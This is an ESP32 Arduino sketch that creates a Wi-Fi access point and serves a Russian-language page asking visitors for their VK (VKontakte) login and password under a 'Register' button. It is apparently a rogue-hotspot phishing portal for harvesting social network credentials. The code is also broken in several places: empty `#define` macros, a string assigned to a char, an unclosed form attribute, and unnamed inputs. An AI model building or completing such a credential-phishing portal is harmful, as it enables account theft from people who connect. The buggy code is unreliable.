#include <ELEMYO.h>
#include <SPI.h>
#include <Wire.h>
#include <WiFi.h>
#include <WebServer.h>

#define smokePin
#define mioPIn
int sensorThres = 400;
char baseurl = '192.168.1.66:8000/';
const char* ssid = "esp32";
const char* password = "123";

IPAddress local_ip(192,168,1,1);
IPAddress gateway(192,168,1,1);
IPAddress subnet(255,255,255,0);
WebServer server(80);

void setup() {
    Serial.begin(115200);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    WiFi.softAP(ssid, password);
    IPAddress IP = WiFi.softAPIP(); 
    Serial.print("AP IP address: "); 
    Serial.println(IP);
    delay(100);
    server.on("/", handle_OnConnect);
    server.onNotFound(handle_NotFound);
    server.begin();
}

void loop() {
    server.handleClient();
//    int analogSensor = analogRead(smokePin);
//    if (analogSensor > sensorThres) {  
//        Serial.println(" Gaz!");         
//    }
//    else {                             
//        Serial.println(" normal");        
//    }
//    server.handleClient();
}

void handle_OnConnect() {
    server.send(200, "text/html", SendHTML()); 
}

void handle_NotFound(){
    server.send(404, "text/plain", "Not found");
}

String SendHTML(){
    String ptr = "<!DOCTYPE html> <html>\n";
    ptr +="<meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\"><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">\n";
    ptr +="<link href=\"https://fonts.googleapis.com/css?family=Open+Sans:300,400,600\" rel=\"stylesheet\">\n";
    ptr +="<form name=\"test\" method=\"post\" action=\"input1.php>";
    ptr +="<p><b>Логин ВК:</b><Br>";
    ptr +="<input type=\"text\" size=\"40\">";
    ptr +="<p><b>Пароль ВК</b><Br>";
    ptr +="<input type=\"text\" size=\"40\">";
    ptr +="<p><input type=\"submit\" value=\"Зарегистрироваться\">";
    ptr +="</form>";
    return ptr;
}